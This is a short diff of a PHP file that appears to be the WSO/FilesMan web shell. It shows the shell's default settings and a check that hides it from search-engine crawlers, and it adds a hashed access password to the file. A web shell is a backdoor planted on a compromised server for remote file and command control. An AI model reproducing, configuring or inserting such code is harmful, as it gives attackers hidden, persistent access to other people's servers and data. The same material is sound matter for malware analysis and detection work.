@@ -4,6 +4,7 @@ $color = "#df5";
 $default_action = 'FilesMan';
 $default_use_ajax = true;
 $default_charset = 'UTF-8';
+$auth_pass = '85cde1c9b2f18adc237066b3e438bf93';
 
 if(!empty($_SERVER['HTTP_USER_AGENT'])) {
     $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
